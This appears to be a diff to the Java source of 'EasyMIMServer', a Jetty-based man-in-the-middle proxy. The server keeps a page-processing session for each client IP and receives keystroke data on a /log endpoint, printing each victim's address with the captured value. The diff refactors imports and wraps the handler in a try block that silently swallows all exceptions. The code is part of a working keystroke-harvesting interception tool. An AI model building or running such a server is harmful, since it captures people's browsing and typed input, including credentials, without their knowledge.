@@ -29,9 +29,7 @@ import org.eclipse.jetty.servlet.ServletHolder;
 
 import sun.org.mozilla.javascript.internal.json.JsonParser;
 
-import MIM.LogElement;
-import MIM.WebsiteProcessor;
-import Main.HTMLReplacer;
+import Models.LogElement;
 
 import com.google.gson.Gson;
 import com.sun.xml.internal.bind.v2.schemagen.xmlschema.List;
@@ -45,22 +43,27 @@ public class EasyMIMServer {
 	    public EasyMIMServlet(){}
 	    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
 	    {
-	    	if(!sessions.containsKey(request.getRemoteAddr())){
-	    		sessions.put(request.getRemoteAddr(),new WebsiteProcessor());
+	    	try{
+		    	if(!sessions.containsKey(request.getRemoteAddr())){
+		    		sessions.put(request.getRemoteAddr(),new WebsiteProcessor());
+		    	}
+		    	if(request.getRequestURI().contains("log")){
+		    		Gson gson = new Gson();
+		    		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
+		    		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
+		    		//log ket stroke data
+		    		//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
+		    		System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.value+")");
+		    		return;
+		    	}
+		    	//log website visit
+		    	//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+request.getRequestURL()+")");
+		    	wp = sessions.get(request.getRemoteAddr());
+				response.setStatus(HttpServletResponse.SC_OK);
+				wp.processRequest(request, response);
+	    	}catch(Exception e){
+	    		
 	    	}
-	    	if(request.getRequestURI().contains("log")){
-	    		Gson gson = new Gson();
-	    		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
-	    		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
-	    		//log ket stroke data
-	    		System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
-	    		return;
-	    	}
-	    	//log website visit
-	    	//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+request.getRequestURL()+")");
-	    	wp = sessions.get(request.getRemoteAddr());
-			response.setStatus(HttpServletResponse.SC_OK);
-			wp.processRequest(request, response);
 	    	
 	    }
 	    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
@@ -85,7 +88,6 @@ public class EasyMIMServer {
         server.setHandler(context);
         context.addServlet(new ServletHolder(new EasyMIMServlet()),"/*");
         //context.addServlet(new ServletHolder(new HelloServlet("Buongiorno Mondo")),"/it/*");
-        //context.addServlet(new ServletHolder(new HelloServlet("Bonjour le Monde")),"/fr/*");
         server.start();
         server.join();
 	}
